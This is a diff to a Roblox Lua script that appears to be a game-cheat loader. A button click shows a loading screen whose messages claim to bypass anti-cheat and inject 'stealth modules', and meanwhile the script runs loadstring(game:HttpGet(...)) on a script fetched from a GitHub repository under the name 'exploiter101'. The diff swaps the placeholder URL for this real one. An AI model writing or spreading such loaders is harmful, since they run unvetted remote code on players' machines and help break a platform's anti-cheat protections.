@@ -411,15 +411,62 @@ local function showRedirectLoadingScreen(callback)
 
     -- Animate "Bypassing Roblox Anti-Cheat Systems..." with dots cycling, for 13 seconds (8+5)
 spawnButton.MouseButton1Click:Connect(function()
-    -- 💥 Start the main script immediately
+    local redirectGui = Instance.new("ScreenGui")
+    redirectGui.Name = "RedirectLoading"
+    redirectGui.IgnoreGuiInset = true
+    redirectGui.ResetOnSpawn = false
+    redirectGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    local bg = Instance.new("Frame", redirectGui)
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(46, 32, 4)
+    bg.BackgroundTransparency = 1
+
+    local frame = Instance.new("Frame", bg)
+    frame.Size = UDim2.new(0, 400, 0, 140)
+    frame.Position = UDim2.new(0.5, -200, 0.5, -70)
+    frame.BackgroundColor3 = Color3.fromRGB(32, 24, 0)
+    frame.BorderSizePixel = 0
+    frame.BackgroundTransparency = 1
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 22)
+
+    local label = Instance.new("TextLabel", frame)
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.GothamBold
+    label.Text = "Module Script Loading..."
+    label.TextSize = 28
+    label.TextColor3 = Color3.fromRGB(255, 200, 100)
+    label.TextStrokeTransparency = 0.7
+    label.TextTransparency = 1
+
+    local sublabel = Instance.new("TextLabel", frame)
+    sublabel.Size = UDim2.new(1, 0, 0, 36)
+    sublabel.Position = UDim2.new(0, 0, 1, -38)
+    sublabel.BackgroundTransparency = 1
+    sublabel.Font = Enum.Font.Gotham
+    sublabel.Text = "Initializing advanced evasion protocols. Please stand by."
+    sublabel.TextSize = 16
+    sublabel.TextColor3 = Color3.fromRGB(255, 220, 120)
+    sublabel.TextStrokeTransparency = 0.8
+    sublabel.TextTransparency = 1
+
+    TweenService:Create(bg, TweenInfo.new(0.38, Enum.EasingStyle.Quad), {BackgroundTransparency = 0.22}):Play()
+    TweenService:Create(frame, TweenInfo.new(0.42, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
+    TweenService:Create(label, TweenInfo.new(0.27, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
+    TweenService:Create(sublabel, TweenInfo.new(0.27, Enum.EasingStyle.Quad), {TextTransparency = 0}):Play()
+    wait(0.48)
+
+    -- Instantly execute your script
     task.spawn(function()
-        loadstring(game:HttpGet("https://your-url.com/spawn.lua"))()
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/exploiter101/ZeoHub/refs/heads/main/ZeoHubScript2.lua"))()
+        end)
     end)
 
-    -- 🔁 Show the loading UI (runs while the script is doing its thing)
-    local redirectTime = 13
-    local steps = 52
-    for i = 1, steps do
+    -- Continue loading animation for effect
+    local totalTime = 13
+    for i = 1, 52 do
         label.Text = "Script Loading" .. string.rep(".", (i % 4))
         sublabel.Text = ({
             [1] = "Establishing secure connection...",
@@ -427,19 +474,17 @@ spawnButton.MouseButton1Click:Connect(function()
             [3] = "Injecting stealth modules...",
             [0] = "Initializing advanced evasion protocols. Please stand by."
         })[i % 4] or sublabel.Text
-        wait(redirectTime / steps)
+        wait(totalTime / 52)
     end
 
     label.Text = "Load Successful!"
     sublabel.Text = "You are undetected. Proceeding..."
 
-    local fadeTime = 0.6
-    TweenService:Create(bg, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
-    TweenService:Create(frame, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
-    TweenService:Create(label, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
-    TweenService:Create(sublabel, TweenInfo.new(fadeTime, Enum.EasingStyle.Quad), {TextTransparency = 1}):Play()
-    wait(fadeTime + 0.05)
-
+    TweenService:Create(bg, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(frame, TweenInfo.new(0.6), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(label, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+    TweenService:Create(sublabel, TweenInfo.new(0.6), {TextTransparency = 1}):Play()
+    wait(0.65)
     redirectGui:Destroy()
 end)
 
